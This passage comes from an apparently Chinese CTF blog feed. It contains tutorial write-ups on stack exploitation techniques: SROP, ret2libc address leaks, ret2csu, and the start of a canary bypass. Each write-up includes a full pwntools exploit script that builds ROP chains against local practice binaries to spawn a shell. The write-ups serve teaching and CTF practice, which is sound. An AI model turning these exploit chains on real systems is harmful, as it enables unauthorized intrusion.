class="hljs-number">3</span>+p64(mov_call)+p64(mov_rax)+p64(rdi)+p64(binsh)+p64(syscall)<br>io.sendline(pay)<br><span class="hljs-string">&quot;&quot;&quot;frame=SigreturnFrame()</span><br><span class="hljs-string">frame.rax=constants.SYS_execve</span><br><span class="hljs-string">frame.rdi=binsh</span><br><span class="hljs-string">frame.rsi=0x0</span><br><span class="hljs-string">frame.rdx=0x0</span><br><span class="hljs-string">frame.rip=syscall</span><br><span class="hljs-string">payload=b&#x27;/bin/sh\x00&#x27;.ljust(0x10,b&#x27;a&#x27;)+p64(0x4004da)+p64(syscall)+bytes(frame)&quot;&quot;&quot;</span><br><br>io.interactive()<br></code></pre></td></tr></table></figure><p><strong>方法二 srop利用</strong></p><p>原理:</p><p>这里基础知识就搬运ctfwiki上的了，讲解的我觉得很全面了，我也会进行添加补充讲解，便于理解。</p><p>signal 机制是类 unix 系统中进程之间相互传递信息的一种方法。一般，我们也称其为软中断信号，或者软中断。比如说，进程之间可以通过系统调用 kill 来发送软中断信号。一般来说，信号机制常见的步骤如下图所示：</p><p><img src="/img/srop/k.png" alt="img"></p><ol><li>内核向某个进程发送 signal 机制，该进程会被暂时挂起，进入内核态。</li><li>内核会为该进程保存相应的上下文，<strong>主要是将所有寄存器压入栈中，以及压入 signal 信息，以及指向 sigreturn 的系统调用地址</strong>。此时栈的结构如下图所示，我们称 ucontext 以及 siginfo 这一段为 Signal Frame。<strong>需要注意的是，这一部分是在用户进程的地址空间的。</strong>之后会跳转到注册过的 signal handler 中处理相应的 signal。因此，当 signal handler 执行完之后，就会执行 sigreturn 代码。</li></ol><p><img src="/img/srop/l.png" alt="img"></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">①保存上下文环境（即各种寄存器），接下来走到②执行信号处理函数，处理完后③恢复相关栈环境，④继续执行用户程序。而在恢复寄存器环境时没有去校验这个栈是不是合法的，如果我们能够控制栈，就能在恢复上下文环境这个环节直接设定相关寄存器的值。<br></code></pre></td></tr></table></figure><p>在执行sigreturn 之后的restore context阶段，整个frame是在用户态，同时会执行大量的pop指令，这时我们就可以直接设定寄存器的值来伪造一个虚假的frame从而getshell</p><p>使用SROP的<strong>前提</strong></p><ul><li><p>首先程序必须存在溢出，能够控制返回地址。</p></li><li><p>可以去系统调用sigreturn（如果找不到合适的系统调用号，可以看看能不能利用read函数来控制RAX的值）</p></li><li><p>必须能够知道&#x2F;bin&#x2F;sh的地址，如果写的bss段，直接写地址就行，如果写到栈里，还需要想办法去泄露栈地址。</p></li><li><p>允许溢出的长度足够长，这样可以去布局我们想要的寄存器的值</p></li><li><p>需要知道syscall指令的地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">frame=SigreturnFrame()<br>frame.rax=constants.SYS_execve<br>frame.rdi=binsh<br>frame.rsi=<span class="hljs-number">0x0</span><br>frame.rdx=<span class="hljs-number">0x0</span><br>frame.rip=syscall<br>payload=<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>.ljust(<span class="hljs-number">0x10</span>,<span class="hljs-string">b&#x27;a&#x27;</span>)+p64(<span class="hljs-number">0x4004da</span>)+p64(syscall)+<span class="hljs-built_in">bytes</span>(frame)<br></code></pre></td></tr></table></figure><p>注意这里的syscall必须是syscall_ret,来控制程序</p></li></ul><p>最终exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>io=process(<span class="hljs-string">&#x27;./ciscn_s_3&#x27;</span>)<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./ciscn_s_3&#x27;</span>)<br><br>pop_csu=<span class="hljs-number">0x40059A</span><br>mov_call=<span class="hljs-number">0x400580</span><br>rdi=<span class="hljs-number">0x4005A3</span><br>vuln=<span class="hljs-number">0x4004ED</span><br>mov_rax=<span class="hljs-number">0x4004E2</span><br>syscall=<span class="hljs-number">0x400517</span><br>payload=<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>+<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">8</span>+p64(vuln)<br>io.sendline(payload)<br>io.recv(<span class="hljs-number">0x20</span>)<br>binsh=u64(io.recv(<span class="hljs-number">8</span>))-<span class="hljs-number">0x118</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(binsh))<br><span class="hljs-string">&#x27;&#x27;&#x27;pay=b&#x27;/bin/sh\x00&#x27;*2+p64(pop_csu)+p64(0)*2+p64(binsh+0x50)+p64(0)*3+p64(mov_call)+p64(mov_rax)+p64(rdi)+p64(binsh)+p64(syscall)&#x27;&#x27;&#x27;</span><br>io.sendline(pay)<br>frame=SigreturnFrame()<br>frame.rax=constants.SYS_execve<br>frame.rdi=binsh<br>frame.rsi=<span class="hljs-number">0x0</span><br>frame.rdx=<span class="hljs-number">0x0</span><br>frame.rip=syscall<br>payload=<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>.ljust(<span class="hljs-number">0x10</span>,<span class="hljs-string">b&#x27;a&#x27;</span>)+p64(<span class="hljs-number">0x4004da</span>)+p64(syscall)+<span class="hljs-built_in">bytes</span>(frame)<br>io.sendline(payload)<br><br>io.interactive()<br></code></pre></td></tr></table></figure><p> 拿到shell</p><p><img src="/img/srop/m.png" alt="img"></p>]]></content>
      
      
      <categories>
          
          <category> 栈利用 </category>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 原创 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于ret2libc的泄露</title>
      <link href="/2024/03/13/libc%E6%B3%84%E9%9C%B2/"/>
      <url>/2024/03/13/libc%E6%B3%84%E9%9C%B2/</url>
      
        <content type="html"><![CDATA[<h1 id="关于ret2libc的泄露"><a href="#关于ret2libc的泄露" class="headerlink" title="关于ret2libc的泄露"></a>关于ret2libc的泄露</h1><p> <strong>原理：在程序运行中，当函数运行过一次之后，会将函数的地址存在got表中，我们可以利用输出函数对函数地址进行泄露</strong></p><h6 id="puts64位"><a href="#puts64位" class="headerlink" title="puts64位"></a><strong>puts64位</strong></h6><p><em><strong>*<a href="https://download.csdn.net/download/zhuo1358/89068003">题目</a>*</strong></em></p><p><img src="/img/libc/a.png"></p><p>基础检查，只有NX保护</p><p>丢入ida</p><p><img src="/img/libc/b.png"></p><p>第二个read 明显存在栈溢出</p><p>寻找system</p><p><img src="/img/libc/c.png"></p><p>发现找不到system 和binsh</p><p>也没有flag的字符，初步认为要泄露libc</p><p>接下来开始payload的构造</p><p>注意64位要用寄存器来传参</p><p>用ROR-gadget寻找合适的寄存器</p><p><img src="/img/libc/d.png"></p><p>泄露出read的真实地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">120</span>+p64(<span class="hljs-number">0x400823</span>)+p64(read_got)+p64(puts_plt)+p64(main)<br></code></pre></td></tr></table></figure><p> 下面是接收数据</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">read=u64(io.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-comment">#read=u64(io.recv(6).ljust(8,b&#x27;\x00&#x27;))</span><br><br><span class="hljs-comment">#主要使用第一个，第二个有数据干扰</span><br><br><span class="hljs-comment">#第一个的原理是我们的地址都是&#x27;\x7f&#x27;开头的，使用只有遇到&#x27;\x7f&#x27;才会开始接收</span><br></code></pre></td></tr></table></figure><p><img src="/img/libc/e.png"></p><p>接下俩找libc版本又两种方法</p><p>一个是去下面网站寻找</p><p><a href="https://libc.blukat.me/?q=read:a50">LibcSearcher</a></p><p><img src="/img/libc/f.png"></p><p>另一种方法是安装LibcSearcher的库</p><p>下面是安装教程</p><p><a href="https://blog.csdn.net/neuisf/article/details/103829683">LibcSearcher安装</a></p><p>我使用的是第二种方法</p><p>泄露出地址之后开始寻找版本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#LibcSearcher的使用示例</span><br>libc=LibcSearcher(<span class="hljs-string">&#x27;read&#x27;</span>,read)<br>libc_base=read-libc.dump(<span class="hljs-string">&#x27;read&#x27;</span>)<br>system_addr = libc_base + libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br>bin_sh_addr = libc_base + libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br></code></pre></td></tr></table></figure><p><img src="/img/libc/g.png"></p><p>选择正确的版本</p><p>最后再进行一次溢出</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">120</span>+p64(<span class="hljs-number">0x40057e</span>)+p64(<span class="hljs-number">0x400823</span>)+p64(bin_sh_addr)+p64(system_addr)+p64(<span class="hljs-number">0xdeadbeef</span>)<br></code></pre></td></tr></table></figure><p>这里还要注意栈对齐，要用寄存器多绕一步来维持栈平衡</p><p><img src="/img/libc/h.png"></p><p>最后运行</p><p><img src="/img/libc/i.png"></p><p>最终exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> LibcSearcher<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>io=process(<span class="hljs-string">&#x27;./libc&#x27;</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./libc&#x27;</span>)<br>read_got=elf.got[<span class="hljs-string">&#x27;read&#x27;</span>]<br>puts_plt=elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>main=elf.sym[<span class="hljs-string">&#x27;main&#x27;</span>]<br>io.recvuntil(<span class="hljs-string">&quot;Hacker,What&#x27;s your name?&quot;</span>)<br>io.sendline(<span class="hljs-string">&#x27;2&#x27;</span>)<br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">120</span>+p64(<span class="hljs-number">0x400823</span>)+p64(read_got)+p64(puts_plt)+p64(main)<br>io.recvuntil(<span class="hljs-string">&quot;then let&#x27;s begin!\n&quot;</span>)<br>io.sendline(payload)<br>read=u64(io.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;the read really address\n&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(read))<br>libc=LibcSearcher(<span class="hljs-string">&#x27;read&#x27;</span>,read)<br>libc_base=read-libc.dump(<span class="hljs-string">&#x27;read&#x27;</span>)<br>system_addr = libc_base + libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br>bin_sh_addr = libc_base + libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br>io.send(<span class="hljs-string">&#x27;2&#x27;</span>)<br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">120</span>+p64(<span class="hljs-number">0x40057e</span>)+p64(<span class="hljs-number">0x400823</span>)+p64(bin_sh_addr)+p64(system_addr)+p64(<span class="hljs-number">0xdeadbeef</span>)<br>io.recvuntil(<span class="hljs-string">&quot;then let&#x27;s begin!\n&quot;</span>)<br>io.sendline(payload)<br>io.interactive()<br></code></pre></td></tr></table></figure><p>这里提醒一下读者，一定要注意数据的接收顺序来编写recvuntil，笔者在这里卡了好久</p><h6 id="write-32位）"><a href="#write-32位）" class="headerlink" title="write(32位）"></a><strong>write(32位）</strong></h6><p><strong>基础检查</strong></p><p><em><strong>*<a href="https://download.csdn.net/download/zhuo1358/89059082">题目</a>*</strong></em></p><p><img src="/img/libc/j.png"></p><p>基础检查，保护基本没开</p><p>丢入ida</p><p><img src="/img/libc/k.png"></p><p><img src="/img/libc/l.png"></p><p>很简单 read 函数存在明显的栈溢出</p><p><img src="/img/libc/m.png"></p><p>同样还是找不到system 也没有flag等字符</p><p>初步认为是libc 泄露</p><p>那么可以运用write函数来泄露got表</p><p>在ida中找到返回函数</p><p><img src="/img/libc/n.png"></p><p>使用payload1的构造为</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">payload =<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">140</span>+p32(write)+p32(<span class="hljs-number">0x80483f4</span>)+p32(<span class="hljs-number">1</span>)+p32(read)+p32(<span class="hljs-number">4</span>)<br></code></pre></td></tr></table></figure><p>这里要注意write函数要传入三个参数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">ssize_t write(<span class="hljs-built_in">int</span> fd,const void*buf,size_t count);<br>参数说明：<br>  fd:是文件描述符（write所对应的是写，即就是<span class="hljs-number">1</span>）<br>  buf:通常是一个字符串，需要写入的字符串<br>  count：是每次写入的字节数<br></code></pre></td></tr></table></figure><p><img src="/img/libc/o.png"></p><p>地址泄露后开始找libc</p><p>这次我选择用第一种方法</p><p><img src="/img/libc/p.png"></p><p>找到对应地址</p><p>开始找算偏移和构造system和binsh 的地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">base=read_got-<span class="hljs-number">0x10a840</span><br>system=base+<span class="hljs-number">0x04c880</span><br>binsh=base+<span class="hljs-number">0x1b5fc8</span><br></code></pre></td></tr></table></figure><p>最后再进行一次 栈溢出</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">140</span>+p32(system)+p32(<span class="hljs-number">0</span>)+p32(binsh)<br></code></pre></td></tr></table></figure><p>运行exp</p><p><img src="/img/libc/q.png"></p><p>最终exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> LibcSearcher<br>sh=process(<span class="hljs-string">&#x27;./123&#x27;</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./123&#x27;</span>)<br>read=elf.got[<span class="hljs-string">&#x27;read&#x27;</span>]<br>write=elf.plt[<span class="hljs-string">&#x27;write&#x27;</span>]<br><br>payload =<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">140</span>+p32(write)+p32(<span class="hljs-number">0x80483f4</span>)+p32(<span class="hljs-number">1</span>)+p32(read)+p32(<span class="hljs-number">4</span>)<br>sh.send(payload)<br>read_got=u32(sh.recv())<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;the read of address :&quot;</span>,<span class="hljs-built_in">hex</span>(read_got))<br><br>base=read_got-<span class="hljs-number">0x10a840</span><br>system=base+<span class="hljs-number">0x04c880</span><br>binsh=base+<span class="hljs-number">0x1b5fc8</span><br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">140</span>+p32(system)+p32(<span class="hljs-number">0</span>)+p32(binsh)<br>sh.send(payload)<br>sh.interactive()<br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 栈利用 </category>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 原创 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>csu利用</title>
      <link href="/2024/03/04/csu%E5%88%A9%E7%94%A8/"/>
      <url>/2024/03/04/csu%E5%88%A9%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="csu的利用"><a href="#csu的利用" class="headerlink" title="csu的利用"></a>csu的利用</h1><p> <strong>原理</strong></p><p>64位的动态连接文件一般有一段万能的gadget,里面可以控制rbx,rbp,r12,r13,r14,r15以及rdx,rsi,edi的值，并且还可以call我们指定的地址。然后劫持程序执行流的时候，劫持到这个__libc_csu_init函数去执行（这个函数是用来初始化libc的)</p><p>csu在我看来分为两种，一种是通过csu泄露基地址后，跟ret2libc一样调用就可以做出，一种是往bss段里注入&#x2F;bin&#x2F;sh,通过调用retsyscall来实现，一般第二种较为常见，这篇文章主要详解第二种</p><p>上题 例题是leve5</p><p><img src="/img/csu/a.png"></p><p>基础检查，只开了NX保护</p><p>丢入ida</p><p><img src="/img/csu/b.png"></p><p>存在溢出</p><p>查找一下后门</p><p><img src="/img/csu/c.png"></p><p>并没有发现</p><p>初步认为是泄露libc</p><p>我一开始的payload构造是跟普通libc一样</p><p>后面发现</p><p><img src="/img/csu/d.png"></p><p>文件缺少可用的寄存器进行传参（64位传参顺序 rdi rsi rdx rcx r8 r9)</p><p> 后面再ida找到了csu函数</p><p><img src="/img/csu/e.png"></p><p><img src="/img/csu/f.png"></p><p>可以看到上面两端汇编几乎囊括了传参的寄存器，而且还有call指令以及retn,我们可以利用这两段gadget来传参和调用，因为我们要先调用下面一段来传参，所以我们认为下面一段为gadget1,上面一段为gadget2</p><p>这里解释一下cmp rbx,rbp。就是检查rbx-rbp是否为0，与jnz指令配合跳转。所以再传参的时候要将rbx设置为0，rbp为1。</p><p>因此可以定义可以传参函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">csu</span>(<span class="hljs-params">r12,r13,r14,r15,last</span>):<br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x80</span>+<span class="hljs-number">8</span>)+p64(<span class="hljs-number">0x400606</span>)+<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">8</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">1</span>)+p64(r12)<br>payload+=p64(r13)+p64(r14)+p64(r15)+p64(<span class="hljs-number">0x4005f0</span>)+<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">56</span>+p64(last)<br>io.send(payload)<br>sleep(<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><p>传参的顺序按照gadget1的顺序来，其中p64(0),p64(1)分别是rbx和rbp</p><p>上面在调用了gadget1后又填充了a*8，因为寄存器是用sp指针来传参的，所以rsp要正确指向寄存器。</p><p><img src="/img/csu/g.png"></p><p>可以看到这里多了var_30的偏移，我们要用gdb查看var_30的大小</p><p>在gadget1下断点运行</p><p><img src="/img/csu/h.png"></p><p>layout asm查看汇编代码试图</p><p><img src="/img/csu/i.png"></p><p>layout reg 查看寄存器状态</p><p><img src="/img/csu/d.png"></p><p>可以看到又0x8的偏移，所以要填充a*8,不同的libc偏移会不同，具体以调试为准</p><p>在执行完gadget2后，栈顶指针rsp距离retn有0x8*7个偏移(相当于传参6个参数和前面提到的8个垃圾数据，我们只有填充完才能覆盖retn返回main,来进行接下来的操作。</p><p>所以泄露libc的代码为</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">csu(write_got,<span class="hljs-number">1</span>,write_got,<span class="hljs-number">8</span>,main)<br>write_real=u64(io.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(write_real))<br></code></pre></td></tr></table></figure><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><p><img src="/img/csu/k.png"></p><p>找到相应的libc 版本(这里不详细描述)</p><p><img src="/img/csu/l.png"></p><p>因为在文件里找不到相应的rdi,所以我们选择用retsyscall来利用，retsyscall调用的是exceve函数</p><p>第二次溢出用read 函数将后门函数注入bss段</p><p><img src="/img/csu/m.png"></p><p><img src="/img/csu/n.png"></p><p>最后进行第三次溢出调用retsyscall</p><p><img src="/img/csu/o.png"></p><p>运行exp得到shell</p><p><img src="/img/csu/p.png"></p><p>最终exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>io=process(<span class="hljs-string">&#x27;./level5&#x27;</span>)<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>elf=ELF(<span class="hljs-string">&#x27;./level5&#x27;</span>)<br>__libc_start_main_addr=elf.got[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>]<br>write_got=elf.got[<span class="hljs-string">&#x27;write&#x27;</span>]<br>read_got=elf.got[<span class="hljs-string">&#x27;read&#x27;</span>]<br>main=elf.sym[<span class="hljs-string">&#x27;main&#x27;</span>]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">csu</span>(<span class="hljs-params">r12,r13,r14,r15,last</span>):<br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x80</span>+<span class="hljs-number">8</span>)+p64(<span class="hljs-number">0x400606</span>)+<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">8</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">1</span>)+p64(r12)<br>payload+=p64(r13)+p64(r14)+p64(r15)+p64(<span class="hljs-number">0x4005f0</span>)+<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">56</span>+p64(last)<br>io.send(payload)<br>sleep(<span class="hljs-number">1</span>)<br>io.recvuntil(<span class="hljs-string">&quot;Hello, World\n&quot;</span>)<br>csu(write_got,<span class="hljs-number">1</span>,write_got,<span class="hljs-number">8</span>,main)<br>write_real=u64(io.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(write_real))<br>base=write_real-<span class="hljs-number">0x0f7af0</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(base))<br>system=base+<span class="hljs-number">0x04c920</span><br>exceve=<span class="hljs-number">0x0d4060</span>+base<br>bss=<span class="hljs-number">0x601028</span><br>csu(read_got,<span class="hljs-number">0</span>,bss,<span class="hljs-number">18</span>,main)<br>io.recvuntil(<span class="hljs-string">&quot;Hello, World\n&quot;</span>)<br>io.sendline(p64(exceve)+<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)<br>csu(bss,bss+<span class="hljs-number">8</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,main)<br>io.interactive()<br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 栈利用 </category>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 原创 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>canary的绕过方法</title>
      <link href="/2024/02/20/canary%E7%9A%84%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/"/>
      <url>/2024/02/20/canary%E7%9A%84%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h1 id="Canary-的绕过方法"><a href="#Canary-的绕过方法" class="headerlink" title="Canary 的绕过方法"></a>Canary 的绕过方法</h1><p> <strong>一、字符串截断获取canary</strong></p><p><strong>原理：</strong></p><ul><li>Canary设计其低字节为<code>\x00</code>，本意是阻止被read、write等函数直接将Canary读出来。<strong>通过栈溢出将低位的<code>\x00</code>覆写，就可以读出Canary的值。</strong></li></ul><p>二话不说，上题</p><img src="/2024/02/20/canary%E7%9A%84%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/1.png" class=""><p>基础检查发现canary</p><p>丢入ida中</p><img src="/2024/02/20/canary%E7%9A%84%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/2.png" class=""><p>发现在循环printf,并且存在字符串漏洞（这个稍后再谈）</p><p>同时有getshell函数</p><img src="/2024/02/20/canary%E7%9A%84%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/3.png" class=""><p>可以直接拿shell</p><p>接下来就是找canary到栈顶的偏移</p><p>有两种方法，这里先介绍第一种</p><p>看汇编语言</p><p>跟进这段函数的汇编</p><img src="/2024/02/20/canary%E7%9A%84%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/4.png" class=""><p>发现 多了一段异或比较 </p><p>可以判断canary在var_c里，</p><img src="/2024/02/20/canary%E7%9A%84%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/5.png" class=""><img src="/2024/02/20/canary%E7%9A%84%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/16.png" class=""><p>所以buf 到canary的偏移为0x70-0xc</p><p>payload1的构造为</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">payload1=<span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x70</span>-<span class="hljs-number">0xc</span>)<br></code></pre></td></tr></table></figure><p><strong>#注意 必须用sendline 发送 用\n来覆盖’\x00’</strong></p><p>发送之后接受字符</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">canary=u32(io.recv(<span class="hljs-number">4</span>))-<span class="hljs-number">0xa</span><br><span class="hljs-comment">#这里之所以要-0xa 是要去掉\n</span><br></code></pre></td></tr></table></figure><p>最后构造payload2</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">payload2=<span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x70</span>-<span class="hljs-number">0xc</span>)+p32(canary)+<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0xc</span>+p32(getshell)<br></code></pre></td></tr></table></figure><p>最终exp为</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 